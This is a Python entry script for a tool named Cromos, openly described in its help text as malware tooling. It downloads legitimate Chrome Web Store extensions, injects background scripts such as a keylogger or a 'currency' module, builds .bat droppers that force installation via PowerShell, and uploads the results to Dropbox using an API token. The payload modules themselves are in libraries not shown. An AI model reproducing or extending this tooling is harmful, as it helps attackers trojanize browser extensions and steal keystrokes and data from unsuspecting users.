#!/usr/bin/python

import argparse
import sys
from libs.download import Download
from libs.drive import Drive
from libs.build import Build
from libs.colors import Colors
from libs.loader import Loader
import os


def main() :

	
	global color

	color = Colors()

	def banner() : 

		banner = """
         (         )      *         )    (     
   (     )\ )   ( /(    (  `     ( /(    )\ )  
   )\   (()/(   )\())   )\))(    )\())  (()/(  
 (((_)   /(_)) ((_)\   ((_)()\  ((_)\    /(_)) 
 )\___  (_))     ((_)  (_()((_)   ((_)  (_))   
((/ __| | _ \   / _ \  |  \/  |  / _ \  / __|  
 | (__  |   /  | (_) | | |\/| | | (_) | \__ \  
  \___| |_|_\   \___/  |_|  |_|  \___/  |___/
	 """
		print("\r{}".format(banner))
		print("Version: {} Builds: {} Modules: {}\n".center(48, " ").format(color.status("1.0"), color.status(1), color.status(2)))

	def help () :

		global extension, builds, token, modules

		parser = argparse.ArgumentParser(description="Cromos is a tool for downloading legitimate extensions of the Chrome Web Store and inject codes in the background of the application and more cromos create executable files to force installation via PowerShell for example, and also upload files to dropbox to host the malicious files.", usage="python cromos.py --help")
		parser.add_argument('--extension', help="Download a extension from Google Chrome Webstore", type=str)
		parser.add_argument('--load', help='Load a script to run in background with the application', type=str)
		parser.add_argument('--build', help='Build types .bat', type=str)
		parser.add_argument('--token', help='Token for uploading files in Dropbox', type=str)

		args = parser.parse_args()

		extension = args.extension # Extensao ID
		modules = args.load 
		token = args.token # API key par ao dropbox
		builds = args.build 

		if len(sys.argv) <= 2:
			parser.print_help()
	
	banner()
	help()

	if extension:
		download = Download(extension)

	if modules == "currency" or modules == "keylogger" :
		loader = Loader(extension, modules).inject()

	if token:
		if not len(token) == 64:
			print("{} Token invalid, enter a valid.".format(color.error("[!]")))
			sys.exit(1)
		else :
			if builds == "bat":
				Build(extension, builds, token).builder()
				Drive(extension, builds, token).upload()

if __name__== "__main__" :

	main()